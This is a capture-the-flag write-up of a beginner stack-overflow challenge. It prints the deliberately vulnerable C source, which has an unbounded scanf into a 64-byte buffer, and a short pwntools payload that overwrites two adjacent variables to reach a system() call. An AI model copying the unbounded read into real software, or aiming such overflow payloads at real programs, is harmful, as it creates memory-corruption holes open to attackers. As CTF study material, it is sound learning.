This is really just a simple overflow into other variables task, but with a little trick that makes it mean. The code:

```c
#include <stdlib.h>
#include <stdio.h>

void main() {
    setbuf(stdout, NULL);
    unsigned int num1;
    unsigned int num2;
    char str3[64];

    puts("Welcome, please set some variables.");
    puts("first number: ");
    scanf("%d", &num1);
    puts("another number: ");
    scanf("%d", &num2);

    if (num1 > 1000 || num2 > 1000) {
        puts("I can't handle numbers larger than 1000!");
        exit(0);
    }

    puts("and then a string: ");
    scanf("%s", &str3);

    if (num1 == 0xcafebabe && num2 == 0xdeadbeef) {
        puts("Congratulations! Here is your flag: ");
        system("cat flag.txt");
    } else {
        printf("num1: %d, num2: %d, string: %s\n", num1, num2, str3);
        puts("Thank you for your service");
    }
    
    exit(0);
}
```

The important thing here (or at least - was for me) is that you scanf using the "%d" format character, and especially that you printf it using the "%d" format character. This leads to weird behavior. So basically you have to overflow the str3 variable into num1 and num2. I found this offset at 72 by trial and error, putting a 1 in num1 and num2 to see when it would return as a 0 in the last printf statement. This is the code:

```python
padding = 72 # value where num=0 -> 72


p.sendlineafter(b': ', b"1")
p.sendlineafter(b': ', b"1")

payload = b"".join([
    b"A" * padding,
    p32(0xdeadbeef),
    p64(0xcafebabe)
    ])
```
Now this actually already solves the challenge. Unless you, like me, just sort of don't properly read the output and overlook the fact that this solves the challenge, and instead focus on the fact that just sending `0xdeadbeef` gives the output:

```bash
num1: 0, num2: -559038737, string: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ\xde
```
Which is really weird, right? Because it's declared as an unsigned int, and unsigned ints can't be negative. Now this might send you into a completely irrelevant rabbit hole. It sure did for me. I basically spent 3 hours in increasing frustration, trying out everything from random numbers to half-baked mathematical formulas to get num2 to align to the decimal value of `0xdeadbeef`. Ultimately I gave up and went to bed.

Now The think here is that num1 and num2 are read and printed using the format char "%d", which is for integer pointers. Now I don't actually know how this works on the bit-level, but when you print an unsigned int as an int it prints a non unsigned int - crazy I know. But the value is still `0xdeadbeef` "under the hood" so to speak. So after a refreshing nights sleep I just sort of realized this and realized I solved the challenge hours before giving up last night. 